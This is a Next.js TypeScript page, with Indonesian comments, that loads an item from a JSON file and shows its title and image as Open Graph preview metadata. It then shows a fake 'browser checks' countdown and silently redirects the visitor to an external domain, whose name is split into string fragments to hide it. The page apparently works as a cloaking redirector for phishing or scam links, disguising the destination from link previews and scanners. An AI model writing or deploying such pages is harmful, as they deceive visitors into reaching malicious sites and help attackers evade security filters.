import fs from "fs";
import path from "path";
import { GetServerSideProps } from "next";
import Head from "next/head";

interface DataItem {
  id: string;
  title: string;
  image: string;
  key: string;
}

export const getServerSideProps: GetServerSideProps<{ item: DataItem }> = async (context) => {
  const { id } = context.params!;

  // Ambil file JSON dari /public/data.json
  const filePath = path.join(process.cwd(), "public", "data.json");
  const jsonData = fs.readFileSync(filePath, "utf-8");
  const data: DataItem[] = JSON.parse(jsonData);

  // Cari data berdasarkan ID
  const item = data.find((x) => x.id === id);

  // Jika tidak ditemukan → tampilkan 404
  if (!item) {
    return { notFound: true };
  }

  return { props: { item } };
};

export default function RedirectPage({ item }: { item: DataItem }) {
  const url1 = "signingunwilling";
  const url2 = ".com";
  const url3 = "/haba8g98r5";

  return (
    <>
      <Head>
        <title>{item.title}</title>
        <meta name="description" content="" />
        <meta property="og:locale" content="en_gb" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content={`https://${url1}${url2}${url3}?key=${item.key}`} />
        <meta property="og:title" content={item.title} />
        <meta property="og:image" content={item.image} />
      </Head>

      <div style={styles.container}>
        <div className="content">
          <h1>Please wait one moment!</h1>
          <h2 id="number">3</h2>
          <p>We need to carry out some browser checks, please wait 3 seconds..</p>
          <p>Thank you for your patience!</p>
        </div>

        <footer>
          <input type="hidden" id="loc" value={item.key} />
        </footer>

        <script
          dangerouslySetInnerHTML={{
            __html: `
              setInterval(function(){ 
                var number = document.getElementById("number").innerHTML;
                var url1 = '${url1}';
                var url2 = '${url2}';
                var url3 = '${url3}';
                if (number > 0) {
                  number--;
                }
                document.getElementById("number").innerHTML = number; 
                if (number == 0) {
                  window.location.replace('https://' + url1 + url2 + url3 + "?key=${item.key}");
                }
              }, 1000);
            `,
          }}
        />
      </div>
    </>
  );
}

const styles = {
  container: {
    textAlign: "center" as const,
    display: "flex",
    flexDirection: "column" as const,
    justifyContent: "center",
    minHeight: "100vh",
    fontFamily: "'Poppins', sans-serif",
  },
};
